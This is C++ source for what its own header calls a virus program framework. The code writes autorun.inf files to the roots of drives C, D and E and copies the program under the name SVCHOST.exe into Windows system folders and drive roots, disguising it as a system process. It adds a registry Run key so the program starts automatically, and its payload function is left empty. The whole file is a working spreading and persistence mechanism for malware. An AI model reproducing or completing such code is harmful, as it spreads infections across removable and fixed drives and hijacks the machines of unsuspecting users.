/*
	病毒程序框架
*/
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
using namespace std;

#include <stdlib.h>
#include <string.h>

#define SVCHOST_NUM 6

int ComputerVirusCopy(const char *infile, const char *outfile){
	FILE *input = NULL, *output = NULL;
	char temp;
	int toReturn = 1; //异常返回1  正常返回0
	if(strcmp(infile, outfile) != 0 && ((input = fopen(infile, "rb")) != NULL) && ((output = fopen(outfile, "wb")) != NULL)){
		while(!feof(input)){
			fread(&temp, 1, 1, input);
			fwrite(&temp, 1, 1, output);
		}
		toReturn = 0;
	}
	fclose(input);
	fclose(output);
	return toReturn;
}

int VirusHB(){
	
}

int main(){
	const char *autoRun = {"[autorun]\nopen=SVCHOST.exe\n\nshell\\1=打开\nshell\\1\\Command=SVCHOST.exe\nshell\\2\\=Open\nshell\\2\\Command=SVCHOST.exe\nshellexecute=SVCHOST.exe"};
	const char *files_autorun[10] = {"c:\\autorun.inf", "d:\\autorun.inf", "e:\\autorun.inf"};
	const char *files_svchost[SVCHOST_NUM+1] = {"c:\\windows\\system\\MSMOUSE.DLL", "c:\\windows\\system\\SVCHOST.exe", "c:\\windows\\SVCHOST.exe", "c:\\SVCHOST.exe", "d:\\SVCHOST.exe", "e:\\SVCHOST.exe", "SVCHOST.exe"};
	const char *regadd = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v SVCHOST /t REG_SZ /d c:/windows/system/SVCHOST.exe";

	FILE *input, *output;
	for(int i = 0; i < 3; i++){
		output = fopen(files_autorun[i], "w");
		fprintf(output, "%s", autoRun);
		fclose(output);
	}
	for(int i = 0; i <= SVCHOST_NUM; i++){
		if((input = fopen(files_svchost[i], "rb")) != NULL){
			fclose(input);
		} else { //文件不存在
			continue;
		}

		//将一处的文件拷贝到所有的应该存在的位置。
		for(int k = 0; k <= SVCHOST_NUM; k++){
			ComputerVirusCopy(files_svchost[i], files_svchost[k]);
			//病毒具体处理代码
			VirusHB();
		}
		i = SVCHOST_NUM + 1;
	}

	//自启动
	system(regadd);
	system("pause");
	return EXIT_SUCCESS;
}